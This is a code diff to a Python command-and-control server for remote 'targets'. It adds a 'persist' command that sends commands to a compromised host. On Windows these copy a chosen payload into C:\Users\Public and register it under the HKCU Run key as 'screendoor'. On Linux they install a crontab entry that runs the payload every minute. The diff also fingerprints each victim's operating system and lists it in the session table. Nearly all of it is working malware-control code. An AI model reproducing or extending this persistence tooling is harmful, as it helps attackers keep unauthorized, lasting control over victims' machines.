@@ -136,7 +136,25 @@ def target_comm(targ_id):
 
         if message == "background":
             break
-        
+
+        if message == "help":
+            pass
+
+        if message == "persist":
+            payload_name = input("[+] Enter name of payload to add to autorun: ")
+            if targets[num][6] == 1:
+                persist_command_1 = f"cmd.exe /c copy {payload_name} C:\\Users\\Public"
+                targ_id.send(persist_command_1.encode())
+                persist_command_2 = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}"
+                targ_id.send(persist_command_2.encode())
+                print("[+] Persistence technique completed.")
+                print("[+] Run this command to clean up the registry: \n reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
+
+            if targets[num][6] == 2:
+                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
+                targ_id.send(persist_command.encode())
+                print("[+] Persistence technique completed.")
+                print("[+] Run this command to clean up the crontab: \n crontab -r")
         else:
             response = comm_in(targ_id)
             if response == "exit":
@@ -162,6 +180,7 @@ def comm_handler():
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
             admin = remote_target.recv(1024).decode()
+            op_sys = remote_target.recv(1024).decode()
 
             if admin == 1:
                 admin_val = "Yes"
@@ -172,13 +191,19 @@ def comm_handler():
             else:
                 admin_val = "No"
 
+            if "Windows" in op_sys:
+                pay_val =1
+            
+            else:
+                pay_val = 2
+
             cur_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
             time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
             
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val])
             
             else:
                 targets.append([remote_target, remote_ip[0], time_record])
@@ -233,17 +258,17 @@ if __name__ == "__main__":
                 #List sessions command handling
                 if command.split(" ")[1] == "-l":
                     myTable = PrettyTable()
-                    myTable.field_names = ["Session", "Status", "Username", "Admin", "Target", "Contact Time"]
+                    myTable.field_names = ["Session", "Status", "Username", "Admin", "Target", "Operating System", "Contact Time"]
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, "Placeholder", target[3], target[4], target[1], target[2]])
+                        myTable.add_row([session_counter, "Placeholder", target[3], target[4], target[1], target[5], target[2]])
                         session_counter += 1
                     print(myTable)
 
                 if command.split(" ")[1] == "-i":
                     num = int(command.split(" ")[2])
                     targ_id = (targets[num])[0]
-                    target_comm(targ_id)
+                    target_comm(targ_id, targets, num)
         
         except IndexError:
             print("[-] Command requires argument(s).")
